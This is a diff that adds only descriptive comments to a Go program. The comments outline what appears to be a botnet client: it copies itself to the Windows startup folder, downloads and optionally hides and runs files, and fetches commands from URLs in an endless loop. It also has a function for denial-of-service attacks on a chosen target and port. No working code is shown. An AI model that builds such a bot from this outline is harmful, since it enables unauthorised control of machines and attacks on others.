@@ -1,0 +1,55 @@
+1: // Package declaration
+
+3: // TODO comments to track future enhancements and testing requirements
+
+17: // Import statements to include necessary packages
+
+19: // Function to check if the program is running with administrative privileges on Windows
+
+24: // Function to copy a file from a source path (src) to a destination path (dst)
+
+32: // Function to copy the executable to the startup folder on Windows
+
+44: // Checks if the program is running with administrative privileges and sets the startup path accordingly
+
+51: // Copies the executable to the startup folder and prints the result
+
+61: // Function to execute a shell script named "otherScript.sh"
+
+68: // Function to determine the OS and set the program to run at startup accordingly
+
+74: // Struct defining the configuration with URL and backup URLs
+
+79: // Function to download a file from a URL and optionally run or hide it after downloading
+
+92: // Checks the HTTP response and proceeds only if successful
+
+100: // Writes the downloaded content to a file
+
+108: // Optionally hides the file on the filesystem
+
+118: // Optionally runs the downloaded file
+
+130: // Function to display a message in a temporary HTML file and open it in a browser
+
+144: // Function to open the temporary HTML file in the default web browser
+
+153: // Function to load the configuration from a JSON file
+
+168: // Function to fetch a command from a list of URLs provided in the Config struct
+
+184: // Function to generate a random string of a specified length
+
+195: // Function to perform a Denial of Service (DoS) attack on a specified target and port for a duration
+
+211: // Function to parse and execute commands received as strings
+
+238: // Function to execute a system command with the provided name and arguments
+
+251: // The main function, entry point of the program
+
+253: // Sets the seed for the random number generator
+
+255: // Loads configuration from a file
+
+262: // Infinite loop to fetch and execute commands at a regular interval
